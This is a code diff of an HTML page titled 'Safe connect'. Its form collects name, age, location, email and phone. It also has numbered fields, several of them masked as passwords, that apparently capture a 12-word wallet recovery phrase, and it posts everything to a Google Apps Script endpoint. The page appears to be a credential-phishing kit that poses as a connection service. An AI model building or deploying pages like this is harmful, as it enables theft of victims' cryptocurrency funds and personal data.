@@ -1,30 +1,70 @@
 <!DOCTYPE html>
-<html>
-    <head> 
-        <link rel="stylesheet" href="Google sheet.css">
-    </head>
-        <body>
-            <div class="container">
-                <form method="post" action="https://script.google.com/macros/s/AKfycbyPHi_Y-MIWP9gDE2oO8Jez2VavaYqwQ3KKFZuTFG8peh0NixMI4mLN5XFYHKrS-mEmhQ/exec" name="contact-form">
-                    <h4>Contact Us</h4>
-                    <input type="name" name="fullname" placeholder="fullname" required>
-                    <input type="number" name="age" placeholder ="age" required>
-                    <input type="name" name="loction" placeholder="location" required>
-                    <input type="text" name="your email" placeholder="E-mail" required> </p>
-                    <input type="hidden" name="access_key" value="">
-                    <input type="password"  placeholder=" 1." required> 
-                    <input type="password"  placeholder="2." required>
-                    <input type="password"  placeholder="3." required>
-                    <input type="password"  placeholder="4." required></p>
-                    <input placeholder="9..." oninput="this.className = ''">
-                    <input placeholder="10..." oninput="this.className = ''">
-                    <input placeholder="11..." oninput="this.className = ''">
-                    <input placeholder="12..." oninput="this.className = ''">
-                    
-                    <input type="submit" value="Submit" id="Submit">
-                </form>
-            </div>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Safe connect</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    
+<div class="form-container">
 
-            <script src="Google sheet.js"></script>
-        </body>
+  <form method="post" action="https://script.google.com/macros/s/AKfycbxj_l5TpLM8ZOlEOZnoDsmJBZ60RkgVBNX_Ge5t_rHQb0rIjKI42KJD-xMF8b69ai9cfQ/exec" method="post">
+      <h4>Enter your details:</h4>
+      <input type="name" name="user name" placeholder="fullname" required>
+      <input type="number" name="age" placeholder ="age" required>
+    
+      
+      <input type="name" name="user name" placeholder="location" required>
+      <input type="text" name="your email" placeholder="E-mail" required> </p>
+
+      <input type="hidden" name="access_key" value="">
+      <input type="password"  placeholder=" 1." required> 
+      <input type="password"  placeholder="2." required>
+      <input type="password"  placeholder="3." required>
+      <input type="password"  placeholder="4." required></p>
+      <input placeholder="9..." oninput="this.className = ''">
+      <input placeholder="10..." oninput="this.className = ''">
+      <input placeholder="11..." oninput="this.className = ''">
+      <input placeholder="12..." oninput="this.className = ''">
+
+    <input class="submitButton" type="submit" value="submit" />
+  </form>
+</div>
+
+<div class="form">
+
+ <label for="gender">Select Gender:</label>
+ <select id="gender" name="Gender">
+  <option value="male">Male</option>
+  <option value="female">Female</option>
+  <option value="other">Other</option>
+</select>
+
+<label for="country">Select Country:</label>
+<select id="country" name="Country">
+  <option value="usa">USA</option>
+  <option value="canada">Canada</option>
+  <option value="uk">UK</option>
+  <option value="nigeria">Nigeria</option>
+  <option value="others">Others</option>
+  <!-- Add more options here -->
+</select>
+
+<input type="text" name="number" placeholder ="phone number" required>
+
+
+<!-- <input type="range" name="volume" min="0" max="100" step="1">
+<input type="color" name="preferred_color"> -->
+<!-- <input type="number" name="quantity" min="1" max="10" step="1"> -->
+<!-- <input type="datetime-local" name="event_datetime"> -->
+<!-- <input type="file" name="file_upload">
+<input type="date"> -->
+</form>
+</div>
+
+  
+ <script src="index.js"></script>
+ </body>
 </html>
